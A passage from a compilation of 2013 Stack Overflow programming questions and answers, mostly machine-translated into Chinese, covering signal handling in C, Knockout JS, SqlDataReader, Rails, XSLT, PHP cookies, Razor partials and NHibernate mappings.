您的代码不调用[sigaction(2)](http://man7.org/linux/man-pages/man2/sigaction.2.html)，我相信它应该调用它。另请阅读[signal(7)](http://man7.org/linux/man-pages/man7/signal.7.html)和[signal-safety(7)](http://man7.org/linux/man-pages/man7/signal-safety.7.html)。并且信号操作（通过`sa_sigaction`字段应该做一些事情（机器特定）`siginfo_t`以跳过有问题的机器指令，或者到`mmap`有问题的地址，或者 call `siglongjmp`，否则当从信号处理程序返回时，你会得到`SIGSEGV`再次因为有问题的机器指令重新启动。

您无法`SIGSEGV`在另一个线程中处理 ，因为同步信号（例如`SIGSEGV`或`SIGSYS`）是特定于线程的（请参阅[此答案](https://stackoverflow.com/a/6533431/841108)），因此您尝试使用的`sigwaitinfo`方法无法实现。特别**`SIGSEGV`是针对有问题的线程**。

另请阅读[有关 Linux 信号的所有内容](http://www.linuxprogrammingblog.com/all-about-linux-signals)。

PS。`SIGSEGV`不再维护的（2019 年 5 月）[Ravenbrook MPS](https://www.ravenbrook.com/project/mps/)垃圾收集器库提供了一个巧妙处理的示例。还要注意 Linux 特定的和最近的[userfaultfd(2)](http://man7.org/linux/man-pages/man2/userfaultfd.2.html)和[signalfd(2)](http://man7.org/linux/man-pages/man2/signalfd.2.html)系统调用。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-25T01:55:52.310

`SIGSEGV`由错误的内存访问引起的信号传递到执行无效访问的线程。根据 POSIX ( [XSH 2.4.1](http://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html#tag_15_04_01) )：

> 在生成时，应确定该信号是为进程还是为进程内的特定线程生成的。由可归因于特定线程的某些动作（例如硬件故障）生成的信号应为导致生成信号的线程生成。应为进程生成与进程 ID 或进程组 ID 或异步事件（例如终端活动）相关联的信号。

尝试`SIGSEGV`在多线程程序中处理的问题在于，虽然传递和信号掩码是线程本地的，但信号*处置*（即调用什么处理程序）是进程全局的。换句话说，`sigaction`为整个进程设置一个信号处理程序，而不仅仅是调用线程。这意味着每个尝试设置自己的`SIGSEGV`处理程序的多个线程将破坏彼此的设置。

我可以提出的最佳解决方案是设置一个全局信号处理程序来`SIGSEGV`使用`sigaction`，最好是使用，`SA_SIGINFO`以便您获得有关故障的其他信息，然后为特定线程的处理程序设置一个线程局部变量。然后，实际的信号处理程序可以是：

```
_Thread_local void (*thread_local_sigsegv_handler)(int, siginfo_t *, void *);
static void sigsegv_handler(int sig, siginfo_t *si, void *ctx)
{
    thread_local_sigsegv_handler(sig, si, ctx);
} 
```

请注意，这使用了 C11 线程本地存储。如果您没有可用的，您可以回退到“GNU C”`__thread`线程本地存储，或 POSIX 线程特定数据（使用`pthread_key_create`和`pthread_setspecific`/ `pthread_getspecific`）。严格来说，后者不是异步信号安全的，因此如果非法访问发生在标准库中的非异步信号安全函数内，则从信号处理程序调用它们会调用 UB。但是，如果它发生在您自己的代码中，您可以确定没有非异步信号安全函数被信号处理程序中断，因此这些函数具有明确定义的行为（嗯，以您的整个程序为模可能已经从它生成的任何东西中获得了 UB `SIGSEGV`...)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-09-17T21:39:06.110

“你为什么要抓 SIGSEGV ？抓了之后怎么办？”

最常见的答案是：退出/中止。但是，将这个信号传递给进程而不是任意终止它的原因是什么？

答案是：因为包括 SIGSEGV 在内的信号只是例外——对于某些应用程序来说，将硬件输出设置为“安全模式”或确保某些重要数据在终止进程之前保持一致状态是非常重要的.

一般有2种segfaults：由写或读操作引起。

**在某些情况下，由读取**操作引起的段错误可以完全安全地捕获甚至忽略 (1)。失败的**写入**操作需要更多的关注和努力才能安全处理（数据/内存损坏的风险），但这也是可能的（通过避免在段错误后动态分配内存）。

“关键信号”（传递给特定线程，如 SIGFPE 或 SIGSEGV）的问题是程序通常不“知道”信号的上下文是什么——也就是说，哪个操作或函数触发了信号。

至少有几种可能的方法来获取这些信息，例如：

1.  每个线程只能执行一类小操作——所以如果它得到一个信号，那么很容易判断发生了什么——>终止线程，验证处理的数据等——>安全终止。
2.  使用**C 异常**- 很少有现成的解决方案，我的是：[libcxc](https://sourceforge.net/projects/libcxc/)

(1) Fe 著名的 ESRCH 问题和 pthread_kill() 为已经自行退出的线程发出:)

# javascript - Knockout JS will not update mapped object

> ID：16204273
> 
> 赞同：1
> 
> 时间：2013-04-25T00:05:03.550
> 
> 标签：javascript, knockout.js

I'm very new to Knockout JS. I haven't found much help through Google on mapping with knockout js. I have a JSON coming in from the server. I map the JSON with the knockout js mapping library. The data-binded dom associated with the property does not update. I have included a fiddle of the script im using. Notice the json object that gets mapped into the observable. When the load button is clicked, the json is mapped and the value of the property "test" is supposed to show up in the tag. Any ideas why its not showing up in the tag?

There is a working example in the JS fiddle.

[http://jsfiddle.net/sLZmQ/](http://jsfiddle.net/sLZmQ/)

This is the JSON that is being mapped

```
 var json = {
"id": 9,
"test": "John Doe",
"firstName": "John",
"lastName": "Doe",
"referenceNumber": "BUY-08",
"position": "Buyer",
"type": "Buyer",
"telephone": "028 82 240780",
"email": "m@email.com",
"departmentId": 3,
"departmentName": "DEPT B",
"country": "United Kingdom"
}; 
```

My Example Script

```
var masterModel = function()
{
var self = this;
self.members = ko.observableArray([]);
self.websites = ko.observableArray([]);    
self.seoData = ko.observable();
self.test =  ko.observable();
self.loadWebsite = function(website)
{

var json = {
"id": 9,
"test": "John Doe",
"firstName": "John",
"lastName": "Doe",
"referenceNumber": "BUY-08",
"position": "Buyer",
"type": "Buyer",
"telephone": "028 82 240780",
"email": "m@email.com",
"departmentId": 3,
"departmentName": "DEPT B",
"country": "United Kingdom"
};

              self.test(ko.mapping.fromJS(json))
              console.log(self.test);

}    
}
    var master = new masterModel();

   ko.applyBindings(master); 
```

The problem is when you click on the loadWebsite the $data.test.test is not updating!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:32:28.203

我更新了，它似乎可以进行一些小的更改：

[http://jsfiddle.net/bYQu7/](http://jsfiddle.net/bYQu7/)

关键是我取消了对“测试”可观察的引用：

```
<h1 data-bind="text: test().test">?</h1> 
```

而且我还初始化了初始值：

```
self.test = ko.observable({ test: ko.observable('WTF') }); 
```

# c# - Using two SqlDataReaders in ASP.NET

> ID：16204276
> 
> 赞同：0
> 
> 时间：2013-04-25T00:05:16.643
> 
> 标签：c#, asp.net, .net, database

I have the following code that I use to process data from two tables, but I can't seem to make two SqlDataReaders to work with it. Any idea how to change it to make it work?

```
//SqlConnection cn = valid SQL Server 2008 connection

using (SqlCommand cmd = new SqlCommand("SELECT * FROM table1", cn))
{
    using (SqlDataReader rdr = cmd.ExecuteReader())
    {
        while (rdr.Read())
        {
            int nVal1 = rdr.GetInt32(0);
            int nVal2 = rdr.GetInt32(1);
            //...
            int nValN = rdr.GetInt32(N);

            //Now I process the data read ...

            //After processing I need to use the results
            //to look up data from another table using 
            //this item's data

            using (SqlCommand cmd2 = new SqlCommand("SELECT * FROM table2 WHERE " + strSQLCondition, cn))
            {
                //But code below doesn't let me create another reader
                using (SqlDataReader rdr2 = cmd2.ExecuteReader())
                {
                    while (rdr2.Read())
                    {
                        //Process results
                    }
                }
            }

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:12:50.727

默认情况下，您只能在连接上使用一个活动数据集。你有几个选择。想到的三个是

1.  事先查找数据并缓存
2.  为您的内部命令使用第二个连接对象
3.  使用 MARS - [http://msdn.microsoft.com/en-us/library/ms131686.aspx](http://msdn.microsoft.com/en-us/library/ms131686.aspx)

# ruby-on-rails - How do I get the next available unique ID in Rails without calling Model.last.id?

> ID：16204277
> 
> 赞同：0
> 
> 时间：2013-04-25T00:05:28.137
> 
> 标签：ruby-on-rails, ruby, postgresql, activerecord, rails-activerecord

I populated a database, then deleted all the users. Now I need to get the next available ID (the last one used was 109, but I need this to work in any situation where this happens, not just my unique one) without calling Model.all.last. Is this possible, and how do I do it?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T01:30:37.530

当您为 ActiveRecord`Model`类创建表时，您将获得一个名为`models`. 此表的`id`s 将是[`serial`](http://www.postgresql.org/docs/current/static/datatype-numeric.html#DATATYPE-SERIAL)从序列中获取其值的列`models_id_seq`。你可以得到这个序列生成的最后一个值：

```
select last_value from models_id_seq 
```

所以你只需要一个简单的[`select_value`](http://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/DatabaseStatements.html#method-i-select_value)调用：

```
last_id = ActiveRecord::Base.connection
                            .select_value('select last_value from models_id_seq')
                            .to_i 
```

请记住，当您尝试查找最后一个`id`值时，您会遇到麻烦的是其他东西正在处理您的表格。这也是 PostgreSQL 特有的，但你已经用[postgresql](/questions/tagged/postgresql "显示标记为“postgresql”的问题")标记了它，所以这应该不是问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:49:59.313

要动态地做到这一点，我会说你最好的选择是将值存储在另一个表中。您可以使用每次添加记录时更新字段的[触发器来执行此操作。](http://en.wikipedia.org/wiki/Database_trigger)此方法不依赖于您的 rails 应用程序，因此它可能比在 ruby​​ 中执行此方法更好。

另外，如果您只是偶尔需要手动更新，我知道如果您使用的是 phpmyadmin 之类的东西，您可以通过查看底部的表结构来获取值，它会显示“Next autoindex”。

# distributed-computing - 通过 SQS/SNS 选举领导者？

> ID：16204279
> 
> 赞同：1
> 
> 时间：2013-04-25T00:05:31.920
> 
> 标签：distributed-computing, amazon-sqs, amazon-sns

我正在使用[欺负算法](http://en.wikipedia.org/wiki/Bully_algorithm)在一组机器之间执行领导者选举。我打算用一个话题作为交流媒介。有没有人尝试过使用[SQS](http://aws.amazon.com/documentation/sqs/) / [SNS](http://aws.amazon.com/documentation/sns/)来处理欺凌算法之类的东西？你遇到了什么问题？我应该遇到什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-29T23:43:03.490

好吧，您应该知道 SNS 没有发布消息端到端时间的 SLA。就个人而言，如果我想实现类似的东西，我会使用 DynamoDB 并让每台机器在表中创建一个项目，然后每隔几秒钟用新的时间戳更新它的项目。然后每台机器查询该表，如果一台机器在一段时间内没有更新，那么它被认为是死机。

我不确定您使用 SNS 执行此操作的确切计划，但如果您想提供有关您的设计的更多详细信息，我可能会发表评论。

# regex - A regular expression for repeated, interleaved copies of a string?

> ID：16204280
> 
> 赞同：2
> 
> 时间：2013-04-25T00:05:32.687
> 
> 标签：regex, theory, regular-language

Find a regular expression for this language:

> L = {λ, ab, abac, abacab,abacabac, abacabacab,...}

Ok so I have been working of this problem for sometime now. So far I know that 'ab' repeats its self (ab)*. But I am stumped on 'ac'.... it cant be (ab)*(ac)*... Any pointers would be appreciated.

I've looked at my book and there is not example that can show me how to solve this.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:15:02.693

让我们从简化一下开始。让我们让 B 表示`ab`和 C 表示`ac`。然后你正在尝试生成字符串

> λ, B, BC, BCB, BCBC, BCBCB, ...

在这种情况下，您可能希望将正则表达式分成两种情况：一种生成

> λ, BC, BCBC, BCBCCBC, BCBCCBC, ...

和一个产生

> B, BCB, BCBCB, BCBCB, ...

前者由正则表达式`(BC)*`给出，后者由正则表达式给出`(BC)*B`。如果将这些组合在一起，您会得到`(BC)* | (BC)*B`，可以将其重写为`(BC)*(B | λ)`。剩下要做的就是通过替换`B`和`C with`ab `and`ac` 来扩展它，它给出了生成的正则表达式

```
(abac)*(ab | λ) 
```

这种观察还应该让您为该语言设计一个 DFA 或 NFA，但我将把它留作练习。:-)

希望这可以帮助！

# php - PHP Hit Counter... 我可以将 SESSION 转换为 COOKIE 吗？

> ID：16204281
> 
> 赞同：2
> 
> 时间：2013-04-25T00:05:35.147
> 
> 标签：php, html, cookies, timer

我已经为此工作了一段时间。制作了一个 PHP 计数器，用于获取前端页面上的视图，并在后端（cms 等）页面上显示视图。

index.php 代码：

```
<?php 
  function get_hits() {
    session_start();
    if(isset($_SESSION['views'])) {
      $_SESSION['views'] = $_SESSION['views']+ 1;
    } else {
      $_SESSION['views'] = 1;
    }
  }
?> 
```

display_hits.php 代码：

```
<?php 
  function display_hits() {
    session_start();
    if(isset($_SESSION['views'])) {
      $_SESSION['views'] = $_SESSION['views'];
    } else {
      $_SESSION['views'] = 1;
    }
    echo "Total Page Views Since Browser Close = ". $_SESSION['views'];
  }
?>
<?php display_hits(); ?> 
```

主要是我希望计数器停留 7 天然后重置。不知道该怎么做...我知道我应该使用 setcookie(); 不知何故。

提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:18:09.560

这是一个函数 setcookie，它需要一个名称、一个值和一个时间。（3600*24*7 = 7 天）

```
setcookie("pageview", $_SESSION['views'], time()+3600*24*7); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:16:07.903

这应该有效。

```
<?php 
  function get_hits() {
    session_start();
    if(isset($_SESSION['views'])) {
      $_SESSION['views'] = $_SESSION['views']+ 1;
      setcookie("counter", $_SESSION["views"], $_SESSION["days"]);
    } else {
      $_SESSION['views'] = 1;
      $_SESSION["days"] = time()+3600*24*7;
      setcookie("counter", $_SESSION["views"], time()+3600*24*7);
    }
  }
?> 
```

你基本上用时间+ 7天存储另一个会话变量并将其存储在cookie中。每当更新计数器时，您都会使用新的计数器值和初始时间/日期更新该 cookie

丁斯

# xslt - XSLT：根据属性选择节点和属性

> ID：16204284
> 
> 赞同：2
> 
> 时间：2013-04-25T00:05:47.747
> 
> 标签：xslt, foreach, nodes

我对 XSLT 样式表很陌生。我和他们一起做了一些非常基础的工作，现在有一个项目正在测试我的能力。我什至不认为我问这个问题的方式是正确的。

下面是一组 XML 数据，代表我正在使用的数据。它的废话数据...

```
<?xml version="1.0" encoding="utf-8"?>
<catalog_new>
    <catalog_old>
        <catalog_newold>
            <final>
                <cd_info title="Empire Burlesque" artist="Dylan" />
                <store name="BestBuy" />
                    <sales thismonth="500"/>
                    <returns thismonth="10"/>
                <store name="Target" />
                    <sales thismonth="500"/>
                    <returns thismonth="10"/>
            </final>
            <final>
                <cd_info title="Stand" artist="REM" />
                <store name="BestBuy" />
                    <sales thismonth="1000"/>
                    <returns thismonth="20"/>
                <store name="Target" />
                    <sales thismonth="530"/>
                    <returns thismonth="50"/>
            </final>
        </catalog_newold>
    </catalog_old>
  </catalog_new> 
```

我需要做的是选择每个 final/cd_info 项目，然后只需选择名称 = Best Buy 的商店记录，然后选择每个销售和退货的本月值。

我正在尝试制作一个如下所示的表格：

```
CDName          Artist          Store           SalesThisMonth    Returns
Stand           R.E.M           Best Buy           500              10 
```

这就是我要去的地方：

```
<?xml version="1.0" encoding="iso-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt" exclude-result-prefixes="msxsl"
>
  <xsl:output method="html" indent="yes" encoding = "utf-8"   standalone = "yes"/>

  <xsl:template match="/">

    <html>
      <head>
        <meta charset="utf-8" />
        <title></title>
      </head>
      <body>

        <table border="1" style="width: 100%;">
          <tr>
            <th>Albumn Name</th>
            <th>Artist</th>
            <th>Store</th>
          </tr>

          <xsl:for-each select ="//catalog_new">
            <xsl:for-each select="catalog_old">
              <xsl:for-each select="catalog_newold">
                <xsl:for-each select="final">
                  <xsl:for-each select="cd_info">
                    <tr>
                      <td>
                        <xsl:value-of  select="@title"/>
                      </td>
                      <td>
                        <xsl:value-of select="@artist"/>
                      </td>
                    </tr>
                  </xsl:for-each>
                </xsl:for-each>
              </xsl:for-each>
            </xsl:for-each>
          </xsl:for-each>
        </table>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet> 
```

我最终删除了我所做的每一次尝试......我只是偏离轨道还是我在正确的轨道上？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:19:12.090

这个怎么样：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt" 
    exclude-result-prefixes="msxsl"
>
  <xsl:output method="html" indent="yes" encoding="utf-8" standalone = "yes"/>
  <xsl:variable name="storeMapNf">
    <map from="BestBuy" to="Best Buy" />
  </xsl:variable>
  <xsl:variable name="storeMapping" select="msxsl:node-set($storeMapNf)/*" />

  <xsl:template match="/">

    <html>
      <head>
        <meta charset="utf-8" />
        <title></title>
      </head>
      <body>

        <table border="1" style="width: 100%;">
          <tr>
            <th>Albumn Name</th>
            <th>Artist</th>
            <th>Store</th>
            <th>SalesThisMonth</th>
            <th>Returns</th>
          </tr>

          <xsl:apply-templates select="//final/store[@name = 'BestBuy']" />
        </table>
      </body>
    </html>
  </xsl:template>

  <xsl:template match="final/store">
    <xsl:variable name="cdi" select="../cd_info" />
    <xsl:variable name="storeMap"
                  select="$storeMapping[@from = current()/@name]" />
    <tr>
      <td>
        <xsl:value-of select="$cdi/@title" />
      </td>
      <td>
        <xsl:value-of select="$cdi/@artist" />
      </td>
      <td>
        <xsl:value-of select="$storeMap/@to |
                                @store[not($storeMap)]"/>
      </td>
      <td>
        <xsl:value-of select="following-sibling::sales/@thismonth"/>
      </td>
      <td>
        <xsl:value-of select="following-sibling::returns/@thismonth"/>
      </td>
    </tr>
  </xsl:template>
</xsl:stylesheet> 
```

在您的示例输入上运行时，结果是：

```
<html>
  <head>
    <META http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
    <table border="1" style="width: 100%;">
      <tr>
        <th>Albumn Name</th>
        <th>Artist</th>
        <th>Store</th>
        <th>SalesThisMonth</th>
        <th>Returns</th>
      </tr>
      <tr>
        <td>Empire Burlesque</td>
        <td>Dylan</td>
        <td>Best Buy</td>
        <td>500</td>
        <td>10</td>
      </tr>
      <tr>
        <td>Stand</td>
        <td>REM</td>
        <td>Best Buy</td>
        <td>1000</td>
        <td>20</td>
      </tr>
    </table>
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T03:16:03.400

**这种转变**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="/*">
    <html>
      <head>
        <meta charset="utf-8" />
        <title></title>
      </head>
      <body>

        <table border="1" style="width: 100%;">
          <tr>
            <th>Albumn Name</th>
            <th>Artist</th>
            <th>Store</th>
            <th>SalesThisMonth</th>
            <th>Returns</th>
          </tr>
          <xsl:apply-templates/>
        </table>
     </body>
    </html>
 </xsl:template>

 <xsl:template match="store[@name='BestBuy']">
  <tr>
    <xsl:apply-templates select=
     "@name| ../cd_info/@* | following-sibling::*[not(position()>2)]/@thismonth"/>
  </tr>
 </xsl:template>

 <xsl:template match="@*">
  <td><xsl:value-of select="."/></td>
 </xsl:template>
</xsl:stylesheet> 
```

**应用于提供的 XML 文档时**：

```
<catalog_new>
    <catalog_old>
        <catalog_newold>
            <final>
                <cd_info title="Empire Burlesque" artist="Dylan" />
                <store name="BestBuy" />
                <sales thismonth="500"/>
                <returns thismonth="10"/>
                <store name="Target" />
                <sales thismonth="500"/>
                <returns thismonth="10"/>
            </final>
            <final>
                <cd_info title="Stand" artist="REM" />
                <store name="BestBuy" />
                <sales thismonth="1000"/>
                <returns thismonth="20"/>
                <store name="Target" />
                <sales thismonth="530"/>
                <returns thismonth="50"/>
            </final>
        </catalog_newold>
    </catalog_old>
</catalog_new> 
```

**产生想要的正确结果：**

```
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

      <meta charset="utf-8">
      <title></title>
   </head>
   <body>
      <table border="1" style="width: 100%;">
         <tr>
            <th>Albumn Name</th>
            <th>Artist</th>
            <th>Store</th>
            <th>SalesThisMonth</th>
            <th>Returns</th>
         </tr>
         <tr>
            <td>Empire Burlesque</td>
            <td>Dylan</td>
            <td>BestBuy</td>
            <td>500</td>
            <td>10</td>
         </tr>
         <tr>
            <td>Stand</td>
            <td>REM</td>
            <td>BestBuy</td>
            <td>1000</td>
            <td>20</td>
         </tr>
      </table>
   </body>
</html> 
```

# php - 使用 PHP 生成长报告

> ID：16204285
> 
> 赞同：1
> 
> 时间：2013-04-25T00:06:30.743
> 
> 标签：php, mysql

我正在尝试多次查询数据库（包含数十万行）并以表格格式显示结果。实际结果涉及大量数字。在网页中显示它们不起作用，因为执行脚本需要很长时间，并且网页在发送到浏览器之前“过期”或超时。有任何想法吗？也许我应该通过电子邮件发送结果？我不知道该怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T05:41:19.647

我认为更好的解释将取决于您尝试做的目的以及您的主要目标到底是什么。

您可以使用 var_export

> [http://php.net/manual/en/function.var-export.php](http://php.net/manual/en/function.var-export.php)

或者，也许您可​​以将结果导出到 excel 文档中，这些文档可以完全按照您的需要完成，例如图形等。

所以你可以选择很多选项来解决这个问题，因为你还没有决定你想要做的选项我无法帮助代码，但如果你想缓存结果，你可以试一试。

# ruby-on-rails - Rails 设计用户存在于空数据库中

> ID：16204286
> 
> 赞同：3
> 
> 时间：2013-04-25T00:06:30.680
> 
> 标签：ruby-on-rails, devise, rake

我正在尝试通过设计创建用户，但遇到了问题。

`home#land`

```
def land
  @resource = User.new
  @devise_mapping = Devise.mappings[:user]
end 
```

`land.html.haml`

```
= form_for @resource, :as => :user, :url => registration_path(:user), :remote => true do
  = label_tag 'user[email]', raw("<h3>Stay Informed!</h3>")
  = text_field_tag 'user[email]', nil, {:placeholder => "Your email", :required => true}
  %input(type="submit" name="commit" value="Add") 
```

`user.rb`

```
class User < ActiveRecord::Base
  before_validation(:on => :create) do
    self.password = "none"
    self.password_confirmation = "none"
  end
  # Include default devise modules. Others available are:
  # :token_authenticatable, :encryptable, :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me
end 
```

正在使用默认的 Devise::RegistrationsController。

这在提交时出现：

`development.log`

```
Started POST "/users" for 127.0.0.1 at 2013-04-24 20:49:46 -0300
Processing by Devise::RegistrationsController#create as JS
  Parameters: {"utf8"=>"✓", "user"=>{"email"=>"me@mjohnst.com"}, "commit"=>"Add"}
  [1m[35m (0.3ms)[0m  BEGIN
  [1m[36mUser Exists (0.5ms)[0m  [1mSELECT 1 AS one FROM "users" WHERE "users"."email" = 'me@mjohnst.com' LIMIT 1[0m
  [1m[35m (0.2ms)[0m  ROLLBACK
  Rendered devise/registrations/create.js (0.4ms)
Completed 200 OK in 84ms (Views: 4.1ms | ActiveRecord: 1.0ms) 
```

但是，在`rails console`：

```
2.0.0p0 :011 > User.all
  User Load (0.5ms)  SELECT "users".* FROM "users"
 => #<ActiveRecord::Relation []> 
```

而且`localhost:5000/users`完全是空的……

当我的数据库中没有用户时，为什么我会得到用户存在和回滚？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-25T00:10:50.040

用户存在查询来自验证器，检查是否没有用户使用您尝试注册的相同电子邮件。永远不会有 INSERT 查询，因此您的用户永远不会被注册。

这可能是验证失败。在这种情况下，您的密码可能太短（默认的 Devise 密码长度验证要求长度至少为 8，而您的密码长度仅为 4）。

您收到成功的 200 响应，因为它正在重定向回注册，并带有一条解释验证失败的消息。

# asp.net-mvc - 使用带有 Knockout 模板集成的部分可编辑集合的 Razor 表单

> ID：16204288
> 
> 赞同：1
> 
> 时间：2013-04-25T00:06:39.073
> 
> 标签：asp.net-mvc, razor, knockout.js

所以，标题有点做作，但这本质上是我想要完成的：

```
<ul data-bind="template: { name: 'ItemFormTemplate', foreach: Items }">
    @foreach (var item in Model.Items)
    {
        Html.RenderPartial("_ItemForm", item);
    }
</ul>

<script type="text/html" id="ItemFormTemplate">
    @{ Html.RenderPartial("_ItemForm", new Item()); }
</script> 
```

这里的想法是：

1.  我希望表单`Item`是部分的，并且我想对 Razor 的 foreach 和为 Knockout 提供模板使用相同的部分。（我不想重复 HTML，也不想为 Knockout 创建一个特殊版本。）

2.  Razor foreach 用于在 JavaScript 被禁用或不支持的情况下进行后备。表单应该仍然是可编辑和可提交的（因为模型绑定器将正确处理 POST 数据），无论是否使用 JavaScript。

3.  这当然意味着字段名称需要遵循`Items[0].SomeField`. 但是，部分将被强类型化为 one `Item`（而不是`IEnumerable<Item>`）。可以理解，这对于 Knockout 模板来说实际上是不可能的，因为当前索引仅在客户端可用。我有一个我已经在使用的解决方法：

    ```
    ko.bindingHandlers.prefixAndIndex = {
        init: function (element, valueAccessor, allBindingsAccessor, viewModel, bindingContext) {
            if (bindingContext.$index) {
                var prefix = ko.utils.unwrapObservable(valueAccessor());
                var $element = $(element);
                $element.find('input,textarea,select').each(function () {
                   var $this = $(this);
                   var newId = prefix + '_' + bindingContext.$index() + '__' + $this.attr('id');
                   var newName = prefix + '[' + bindingContext.$index() + '].' + $this.attr('name');
                   $('label[for=' + $this.attr('id') + ']').attr('for', newId);
                   $this.attr('id', newId);
                   $this.attr('name', newName);
                });
            }
        }
    }; 
    ```

    这只是绑定到模板的顶级元素（`<li>`在这种情况下），并搜索并用适当的前缀替换所有 id 和 name 属性。它似乎工作得很好，但欢迎任何批评或改进建议。

真的，我现在唯一挣扎的是在 Razor foreach 中将正确的前缀放入部分中。通常，您会使用 a`for`而不是解决此问题`foreach`，然后传递索引项而不是通用项，即：

```
@for (var i = 0; i < Model.Items.Count(); i++)
{
    @Html.TextBoxFor(m => m.Items[i].SomeField)
} 
```

但是，这在使用部分时不起作用，因为一旦进入部分，您仍然只是在处理一个`Item`脱离上下文的单个 。

所以，最紧迫的问题是我怎样才能仍然使用部分强类型 to `Item`，但仍然让它知道存在的任何索引？然后，除此之外，如何最好地减少重复或 HTML 和逻辑（增加代码重用）。我的其余想法是否走在正确的轨道上。有什么我可以改进或做得更好的吗？

**编辑**

我应该提一下，*理想情况下*，我想保留部分强类型并实际利用它。换句话说，我希望能够做到`@Html.TextBoxFor(m => m.SomeField)`而不是像`@Html.TextBox("Items[" + iterator + "].SomeField")`. 如果我*必须*走那条路，那是一回事，但我希望有更好的方法。

我想我也可以按照以下方式做一些事情：

```
@Html.TextBox(prefix + "[" + iterator + "]." + Html.NameFor(m => m.SomeField)) 
```

然后传`prefix`和`iterator`入偏。从某种意义上说，这更好，因为我不必处理硬编码的值，但这是*很多*额外的逻辑，特别是对于具有一堆字段的部分。再次，希望有更好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-05T15:14:11.507

您的问题指出普遍缺乏关于如何在 asp.net Mvc 中处理前缀的知识，因为在 10 天内没有人能够提出“可接受的”解决方案，尽管有几种方法可以以干净的方式将前缀传递给您的部分看法：

**1**你可以获得同样的效果

```
@Html.TextBoxFor(m => m.Items[i].SomeField) 
```

通过使用 DisplayFor 或 EditorFor 调用局部视图：

```
@Html.DisplayFor(m => m.Items[i].SomeField) 
```

您可以使用与项目数据类型相同的名称定义显示/编辑模板，或者只是将部分视图的名称传递给 EditorFor/DisplayFor 助手。有关更多信息，请参见[此处](http://bradwilson.typepad.com/blog/2009/10/aspnet-mvc-2-templates-part-4-custom-object-templates.html)。

**2**您也可以使用与前一个答案相同的 RenderPartial 重载，通过将要使用的完整前缀分配给 ViewDataDictionary 属性：ViewDataDictionary.TemplateInfo.HtmlFieldPrefix

完成此操作后，您提供的前缀将自动添加到所有输入字段名称中。

所以如果你写：

```
@Html.TextBoxFor(m => m.Property) 
```

文本框的名称为：Prefix.Property，其中 Prefix 是您传入的前缀

ViewDataDictionary.TemplateInfo.HtmlFieldPrefi

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-30T17:50:42.940

> 所以，最紧迫的问题是我如何仍然对 Item 使用部分强类型，但仍然让它知道存在的任何索引？

我想你只是想知道数组中的索引，你应该在 ViewDataDictionary 中传递它。

```
@for (var i = 0; i < Model.Items.Count(); i++){
  Html.RenderPartial("_ItemForm", Model.Items[i], new ViewDataDictionary(){
    { "index", i }
  });
} 
```

# c# - 如何在流畅的nhibernate中将实体映射到实体集合字典

> ID：16204290
> 
> 赞同：0
> 
> 时间：2013-04-25T00:06:55.223
> 
> 标签：c#, nhibernate, fluent-nhibernate, nhibernate-mapping, fluent-nhibernate-mapping

我有这个类（从它们中删除冗余信息之后）：

```
public class Category : BaseEntity
{
    public virtual Category ContainingCategory { get; set; }
    public virtual IList<CategoryProperty> Properties { get; set; }
}

public class CategoryProperty : BaseEntity
{
    public virtual string Name { get; set; }
    public virtual IList<CategoryPropertyValue> Values { get; set; }
}

public class CategoryPropertyValue : BaseEntity
{
    public virtual string Name { get; set; }
}

public class CategoryPropertyValueCollection : BaseEntity
{
    public virtual IList<CategoryPropertyValue> Values { get; set; }
}

public class Product : BaseEntity
{
    public virtual string Name { get; set; }
    public virtual Category ContainingCategory { get; set; }
    public virtual IDictionary<CategoryProperty, CategoryPropertyValueCollection> Properties { get; set; }
} 
```

这些是我的映射（再次删除冗余信息后）：

```
public class CategoryMap : BaseMap<Category>
{
    public CategoryMap()
    {
        Map(x => x.Name);
        HasMany(x => x.Properties);
    }
}

public class CategoryPropertyMap : BaseMap<CategoryProperty>
{
    public CategoryPropertyMap()
    {
        Map(x => x.Name);
        HasMany(x => x.Values);
    }
}

public class CategoryPropertyValueMap : BaseMap<CategoryPropertyValue>
{
    public CategoryPropertyValueMap()
    {
        Map(x => x.Name);
    }
}

public class CategoryPropertyValueCollectionMap : BaseMap<CategoryPropertyValueCollection>
{
    public CategoryPropertyValueCollectionMap()
    {
        HasMany(x => x.Values).Cascade.None();
    }
}

public class ProductMap : BaseMap<Product>
{
    public ProductMap()
    {
        Map(x => x.Name);
